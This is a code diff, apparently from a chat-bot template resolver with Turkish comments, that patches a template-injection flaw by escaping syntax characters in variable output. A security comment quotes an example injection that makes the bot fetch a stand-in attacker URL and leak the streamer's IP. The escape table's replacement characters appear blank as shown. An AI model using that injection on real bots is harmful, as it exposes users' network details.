@@ -24,6 +24,48 @@ import { SINIR, type DegiskenBaglam, type DegiskenTanimi } from './types.js';
 export type Kayit = Map<string, DegiskenTanimi>;
 
 /**
+ * GÜVENLİK — şablon enjeksiyonu (4. tur denetimi).
+ *
+ * Çözümleyici bir değişkenin DEĞERİNİ metne koyup metni yeniden tarıyordu:
+ * yanıtı `Yazdın: $(query)` olan komuta izleyici `!komut $(urlfetch
+ * http://saldirgan/x)` yazınca bot o adrese istek atıyor (yayıncının IP'si
+ * sızar), `fetch[...]`, `<hideText>`, `<ifKick>` gibi eski biçimler de izleyici
+ * metninde çalışıyordu. Kural: değişkenlerin ürettiği değer (izleyici metni,
+ * getirilen sayfa, saklanan değer, yapay zekâ yanıtı) VERİdir, kod değildir.
+ *
+ * Değer metne konurken sözdizimi karakterleri Unicode özel kullanım
+ * alanındaki karşılıklarına çevrilir; tarayıcı onları görmez. En sonda geri
+ * çevrilir. İşleyiciler argümanlarını GERÇEK metin olarak alır (urlencode
+ * gibi dönüşümler bozulmaz). Yalnız `earlyFetch` bilinçli olarak getirdiği
+ * içeriği şablon sayar (şablon yazarının tercihi).
+ */
+const KACIS: ReadonlyArray<readonly [string, string]> = [
+  ['$', ''],
+  ['(', ''],
+  [')', ''],
+  ['{', ''],
+  ['}', ''],
+  ['<', ''],
+  ['>', ''],
+  ['[', ''],
+  [']', '']
+];
+const KACIS_GIDIS = new Map(KACIS.map(([a, b]) => [a, b]));
+const KACIS_DONUS = new Map(KACIS.map(([a, b]) => [b, a]));
+const KACIS_GIDIS_RE = /[$(){}<>[\]]/g;
+const KACIS_DONUS_RE = /[-]/g;
+
+/** Değeri veri olarak işaretler: yeniden değişken/etiket olarak yorumlanmaz. */
+export function veriKacisla(deger: string): string {
+  return String(deger).replace(KACIS_GIDIS_RE, (c) => KACIS_GIDIS.get(c) || c);
+}
+
+/** İşaretli veriyi gerçek karakterlere döndürür (çıktıda ve işleyici girdisinde). */
+export function kacisiGeriAl(metin: string): string {
+  return String(metin).replace(KACIS_DONUS_RE, (c) => KACIS_DONUS.get(c) || c);
+}
+
+/**
  * Metindeki EN İÇTEKİ `$(...)` ifadesini bulur.
  * İç içe olanları çözebilmek için içinde başka `$(` barındırmayan ilk
  * kapanışı arar. Bulunamazsa null döner.
@@ -139,25 +181,32 @@ async function eskiBicim(metin: string, kayit: Kayit, ctx: DegiskenBaglam): Prom
     const parcalar = [...sonuc.matchAll(/fetch\[([^\]]+)\]/g)];
     for (const m of parcalar) {
       const deger = await guvenliCagir(getir, String(m[1]).trim(), ctx);
-      sonuc = sonuc.replace(m[0], deger);
+      // Fonksiyonla: değerdeki `$&` gibi diziler yerine koyma kalıbı sayılmasın
+      sonuc = sonuc.replace(m[0], () => deger);
     }
   }
 
   return sonuc;
 }
 
-/** İşleyiciyi çağırır; patlarsa komut tamamen çökmesin diye hata metni döner. */
+/**
+ * İşleyiciyi çağırır; patlarsa komut tamamen çökmesin diye hata metni döner.
+ * Argüman gerçek metne çevrilerek verilir; dönen değer VERİ olarak işaretlenir
+ * (`veriKacisla`) — `kacislaCikti: false` yalnız earlyFetch içindir.
+ */
 async function guvenliCagir(
   tanim: DegiskenTanimi,
   ham: string,
-  ctx: DegiskenBaglam
+  ctx: DegiskenBaglam,
+  kacislaCikti = true
 ): Promise<string> {
   // Test kipinde kalıcı veri değiştiren değişkenler atlanır: test uyarısı
   // gerçek puanı veya sayacı bozmamalı.
   if (tanim.yazar && ctx.isTest) return '';
   try {
-    const d = await tanim.isleyici(ham, ctx);
-    return d === undefined || d === null ? '' : String(d);
+    const d = await tanim.isleyici(kacisiGeriAl(ham), ctx);
+    const s = d === undefined || d === null ? '' : String(d);
+    return kacislaCikti ? veriKacisla(s) : s;
   } catch (e: any) {
     console.warn(`[Değişken] $(${tanim.ad}) hata:`, e?.message || e);
     return `(${tanim.ad} hata)`;
@@ -182,8 +231,9 @@ export async function coz(sablon: string, kayit: Kayit, ctx: DegiskenBaglam): Pr
     const parcalar = [...metin.matchAll(/\$\(earlyFetch\s+([^)]+)\)/gi)];
     for (const m of parcalar) {
       if (sayac++ >= SINIR.degisken) break;
-      const deger = await guvenliCagir(erken, String(m[1]).trim(), ctx);
-      metin = metin.replace(m[0], deger);
+      // earlyFetch BİLİNÇLİ olarak getirdiği içeriği şablon sayar: kaçışlanmaz
+      const deger = await guvenliCagir(erken, String(m[1]).trim(), ctx, false);
+      metin = metin.replace(m[0], () => deger);
     }
   }
 
@@ -195,7 +245,7 @@ export async function coz(sablon: string, kayit: Kayit, ctx: DegiskenBaglam): Pr
       const hedef = enIcteki(metin);
       if (!hedef) break;
       if (sayac++ >= SINIR.degisken) {
-        metin = metin.slice(0, hedef.bas) + '(sınır aşıldı)' + metin.slice(hedef.bit + 1);
+        metin = metin.slice(0, hedef.bas) + veriKacisla('(sınır aşıldı)') + metin.slice(hedef.bit + 1);
         break;
       }
 
@@ -203,7 +253,7 @@ export async function coz(sablon: string, kayit: Kayit, ctx: DegiskenBaglam): Pr
       const tanim = kayit.get(ad);
       // Tanımsız değişken: ham metni koru ama parantezi kaldır ki döngüye
       // girmesin. Kullanıcı yazım hatasını görebilsin.
-      const deger = tanim ? await guvenliCagir(tanim, ham, ctx) : `(${ad}?)`;
+      const deger = tanim ? await guvenliCagir(tanim, ham, ctx) : veriKacisla(`(${ad}?)`);
 
       metin = metin.slice(0, hedef.bas) + deger + metin.slice(hedef.bit + 1);
       bulundu = true;
@@ -226,5 +276,7 @@ export async function coz(sablon: string, kayit: Kayit, ctx: DegiskenBaglam): Pr
   // 5) Gizli metin — yan etkiler zaten çalıştı, çıktıdan silinir
   metin = gizliMetniSil(metin);
 
-  return bosluklariTopla(metin).slice(0, SINIR.ciktiUzunluk);
+  // 6) Veri işaretlerini geri al: izleyici metni aynen görünür ama hiçbir
+  //    aşamada kod olarak çalışmadı.
+  return kacisiGeriAl(bosluklariTopla(metin).slice(0, SINIR.ciktiUzunluk));
 }
